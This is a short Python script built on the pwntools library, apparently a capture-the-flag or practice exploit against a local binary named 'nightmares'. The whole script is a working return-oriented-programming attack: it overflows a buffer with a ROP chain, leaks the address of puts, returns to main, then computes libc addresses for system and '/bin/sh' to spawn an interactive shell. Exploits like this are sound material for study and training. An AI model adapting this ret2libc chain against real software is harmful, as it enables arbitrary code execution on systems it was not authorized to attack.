#!/usr/bin/env python3
from pwn import *

context.arch = "amd64"

target = process("./bin/nightmares")

io = gdb.debug(
    "./bin/nightmares",
    """
    break nightmares.c:32
    c 
    c


    """,
    terminal=["gnome-terminal", "--geometry=160x80", "-e"],
)

# io = target

# gadget1 = pop rsi ; pop rdi ; pop rbp ; ret

rop_gadget = p64(0x40124D)
rop_gadget1 = p64(0x40124C)
puts_got = p64(0x404000)
puts_plt = p64(0x401030)
main = p64(0x4012C8)

divisible_by_16 = p64(0x100000000000000)

bin_sh_offset = 0x11E6B1
system_offset = -0x2B4F0
# offsets -> /bin/sh = 0x7f139755f031 - 0x7f1397440980 = -0x11e6b1
# offsets -> system -> 0x2b4f0

payload = (
    b"A" * 0x48 + rop_gadget1 + b"A" * 0x8 + puts_got + b"A" * 0x8 + puts_plt + main
)

io.recvline()
io.recvline()
io.recvline()
io.recvline()
io.sendline(payload)
io.recvline()
io.recvline()
puts_leak = u64(io.recvline().strip().ljust(8, b"\x00"))
print(hex(puts_leak))
io.recvline()


io.recvline()
io.recvline()
io.recvline()
payload1 = (
    b"A" * 0x48
    + rop_gadget
    + p64(puts_leak + bin_sh_offset)
    + b"B" * 0x8
    + p64(puts_leak + system_offset)
)
print(len(payload1))
io.sendline(payload1)
io.recvline()
io.interactive()
